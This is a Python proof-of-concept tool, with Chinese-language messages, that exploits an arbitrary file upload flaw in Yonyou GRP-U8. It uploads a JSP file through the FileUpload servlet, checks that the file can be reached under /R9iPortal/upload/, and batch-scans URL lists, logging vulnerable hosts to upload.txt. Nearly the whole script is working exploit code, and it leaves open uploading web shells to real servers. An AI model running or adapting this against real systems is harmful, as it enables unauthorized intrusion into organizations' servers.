import argparse
import requests
import sys

def checkvuln(url):
    attackurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    uploadurl = url + "/R9iPortal/upload/1.jsp"
    data = """<% out.println("hello");%>"""
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
               'Content-Type': 'multipart/form-data; boundary=---------------------------32840991842344344364451981273'}
    try:
        response = requests.post(attackurl,headers=headers,data=data,timeout=5,verify=False)
        if response.status_code == 200:
            if 'hello' in requests.get(uploadurl,headers=headers,timeout=5,verify=False).text:
                print(f'[+]当前网址存在漏洞，且上传文件路径为{uploadurl}')
                with open("upload.txt",'a+') as f:
                    f.write(uploadurl+"\n")
            else:
                print("[-]目标网站不存在漏洞")
        else:
            print("[-]目标网站不存在漏洞")
    except Exception as e :
        print("[-]无法访问目标网站")
#批量检测漏洞
def checkurls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            checkvuln(readline)
def startwith():

    logo = """
__  ____  __      __________  ____        __  ______        ________  __
\ \/ /\ \/ /     / ____/ __ \/ __ \      / / / ( __ )      / ____/ / / /
 \  /  \  /_____/ / __/ /_/ / /_/ /_____/ / / / __  |_____/ /_  / / / / 
 / /   / /_____/ /_/ / _, _/ ____/_____/ /_/ / /_/ /_____/ __/ / /_/ /  
/_/   /_/      \____/_/ |_/_/          \____/\____/     /_/    \____/   
    """
    # 修改横幅信息
    print(logo)
    print("用友GRP-U8-FileUpload任意文件上传漏洞检测工具")


if __name__ == '__main__':
    startwith()
    parser = argparse.ArgumentParser(
        description="This is an any fileupload detection exploitation tool")

    # 添加命令行参数 处理这些参数
    parser.add_argument("-u", "--url", help="Specify the target URL for the attack")
    parser.add_argument("-user", "--username", help="Specify the username")
    parser.add_argument("-passwd", "--password", help="Specify the password")
    parser.add_argument("-f", "--file", help="Specify the username file")
  #  parser.add_argument("-m", "--mode", choices=["poc", "exp"], help="Specify the mode (poc or exp)")
    # 调用
    args = parser.parse_args()
    # 根据命令行参数执行相应的功能
    if args.url:
        checkvuln(args.url)
    elif args.file:
        checkurls(args.file)
    else:
        parser.print_help()
